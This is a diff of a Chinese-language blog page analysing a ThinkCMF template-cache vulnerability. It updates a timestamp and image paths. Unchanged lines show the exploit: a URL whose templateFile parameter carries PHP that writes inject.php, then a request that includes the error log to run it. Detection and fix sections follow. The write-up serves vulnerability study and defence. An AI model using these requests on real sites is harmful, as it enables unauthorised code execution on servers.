@@ -236,7 +236,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2 小时前
+                  本文最后更新于：1 年前
                 
               </p>
             
@@ -247,10 +247,10 @@
 <h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>该版本的display方法是public的。</p>
 <p>因此通过构造a参数的display方法，让ThinkCMF加载我们提供的“模板”。</p>
 <p><a target="_blank" rel="noopener" href="http://localhost/ThinkCMFX/?a=display&amp;templateFile=%3C?php%20file_put_contents(%27inject.php%27,%27%3C?php%20echo(%22injected%22);?%3E%27);die();?%3E">http://localhost/ThinkCMFX/?a=display&amp;templateFile=%3C?php%20file_put_contents(%27inject.php%27,%27%3C?php%20echo(%22injected%22);?%3E%27);die();?%3E</a></p>
-<p>代码很简单，生成一个inject.php文件，内容是打印injected。<br><img src="https://p3.ssl.qhimg.com/t019a6e934f4a1adbff.png" srcset="/img/loading.gif"><br>记录报错日志文件格式为YY_MM_DD.log，如当前日期为2020年5月13日，日志文件为20_05_13.log。<br>然后包含该日志文件：</p>
+<p>代码很简单，生成一个inject.php文件，内容是打印injected。<br><img src="ThinkCMF-%E6%A8%A1%E6%9D%BF%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/t019a6e934f4a1adbff.png" srcset="/img/loading.gif"><br>记录报错日志文件格式为YY_MM_DD.log，如当前日期为2020年5月13日，日志文件为20_05_13.log。<br>然后包含该日志文件：</p>
 <p><a target="_blank" rel="noopener" href="http://localhost/ThinkCMFX/?a=display&amp;templateFile=data/runtime/Logs/Portal/20_05_13.log">http://localhost/ThinkCMFX/?a=display&amp;templateFile=data/runtime/Logs/Portal/20_05_13.log</a></p>
-<p><img src="https://p4.ssl.qhimg.com/t0100b207382975852b.png" srcset="/img/loading.gif"></p>
-<p>此时在web根目录下已经生成了inject.php。<img src="https://p0.ssl.qhimg.com/t01dd000fba6524d2a8.png" srcset="/img/loading.gif"></p>
+<p><img src="ThinkCMF-%E6%A8%A1%E6%9D%BF%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/t0100b207382975852b.png" srcset="/img/loading.gif"></p>
+<p>此时在web根目录下已经生成了inject.php。<img src="ThinkCMF-%E6%A8%A1%E6%9D%BF%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/t01dd000fba6524d2a8.png" srcset="/img/loading.gif"></p>
 <h2 id="四、漏洞检测"><a href="#四、漏洞检测" class="headerlink" title="四、漏洞检测"></a>四、漏洞检测</h2><p>1.可检测display/fetch等函数是否为public；<br>2.检测?a=display&amp;templateFile=”aaa”的response body中是否包含“模板不存在”字样。</p>
 <h2 id="五、修复方案"><a href="#五、修复方案" class="headerlink" title="五、修复方案"></a>五、修复方案</h2><p>1.升级版本<br>2.临时方案：可将 HomebaseController.class.php 和 AdminbaseController.class.php类中display和fetch函数由public改为protected。</p>
 
